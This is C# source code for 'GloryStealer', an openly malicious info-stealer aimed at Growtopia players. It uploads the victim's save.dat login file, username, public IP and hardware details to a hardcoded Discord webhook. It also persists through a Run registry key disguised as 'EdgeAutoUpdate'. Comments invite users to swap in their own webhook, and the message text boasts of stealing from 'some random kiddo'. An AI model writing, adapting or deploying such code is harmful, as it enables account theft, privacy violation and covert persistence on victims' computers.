using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using System.Reflection;
using Microsoft.Win32;

namespace GloryStealer
{


    class EmbedField
    {
        public string Name { get; }
        public string Value { get; }

        public EmbedField(string name, string value)
        {
            Name = name;
            Value = value;
        }
    }


    internal class Program
    {
        //REPLACE UR WEBHOOK HERE!!
        static string webhook = "https://discordapp.com/api/webhooks/1157673784124379156/uuSUVxx66AMa1ZBJWc5YPQD2DK7UejXcvZbrBQtiJQ6tjtI6PcnXdmRmExO14ERW51Ic";

        static string real_ip = GetIP();

        static string GetFieldsJson(List<EmbedField> fields)
        {
            StringBuilder fieldsJson = new StringBuilder("[");
            foreach (var field in fields)
            {
                fieldsJson.Append($"{{\"name\":\"{field.Name}\",\"value\":\"{field.Value}\",\"inline\":false}},");
            }
            if (fieldsJson.Length > 1)
            {
                fieldsJson.Length--; // Remove the trailing comma
            }
            fieldsJson.Append("]");

            return fieldsJson.ToString();
        }
    




    static string GetIP()
        {
            string ipmyass = "";

            using (WebClient x = new WebClient()) 
            {
                ipmyass = x.DownloadString("https://api.ipify.org/");
            }

            return ipmyass;
        }
        static async Task SendCustomEmbed(string hook, List<EmbedField> fields)
        {
            try
            {
                string fieldsJson = GetFieldsJson(fields);

                string jsonPayload = $"{{\"content\":\"\",\"embeds\":[{{\"title\":\"Glory Stealer :eagle: :fire:\",\"description\":\"U just beamed some random kiddo:skull:\",\"color\":16744192,\"fields\":{fieldsJson}}}]}}";

                var httpClient = new HttpClient();
                var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                var response = await httpClient.PostAsync(hook, content);

                if (response.IsSuccessStatusCode)
                {
                    
                }
                else
                {
                    
                }
            }
            catch (Exception ex)
            {
                
            }
        }



        static async Task SendFile(string hook, string filePath)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                using (MultipartFormDataContent content = new MultipartFormDataContent())
                using (FileStream fileStream = File.OpenRead(filePath))
                {
                    
                    content.Add(new StreamContent(fileStream), "file", Path.GetFileName(filePath));

                    
                    HttpResponseMessage response = await client.PostAsync(hook, content);
                     if (response.IsSuccessStatusCode)
                    {
                        string responseContent = await response.Content.ReadAsStringAsync();
                        
                    }
                    else
                    {
                        
                    }
                }
            }
            catch (Exception ex){}
        }


        static string GetCpuInfo()
        {
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Processor");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);

            foreach (ManagementObject obj in searcher.Get())
            {
                return obj["Name"].ToString();
            }

            return "N/A";
        }

        static string GetGpuInfo()
        {
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_VideoController");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);

            foreach (ManagementObject obj in searcher.Get())
            {
                return obj["Caption"].ToString();
            }

            return "N/A";
        }


        static void Main(string[] args)
        {

            

            

            string local_appdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            string save_dat = local_appdata + "\\Growtopia\\save.dat";


            string CPU = GetCpuInfo();
            string GPU = GetGpuInfo();

            string install_pathhh = Assembly.GetEntryAssembly().Location;


            

            
            //if u want this feature. U need to make this program to run as admin
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
                key.SetValue("EdgeAutoUpdate", install_pathhh);
                key.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }

            

            SendFile(webhook, save_dat);

            //SendCustomEmbed(webhook);




            List<EmbedField> fields = new List<EmbedField>
        {
            new EmbedField("Username", Environment.UserName),
            new EmbedField("IP Address", real_ip),
            new EmbedField("GPU", GPU),
            new EmbedField("CPU", CPU)
            

            
        };

            SendCustomEmbed(webhook, fields).Wait();
        }
    }
}
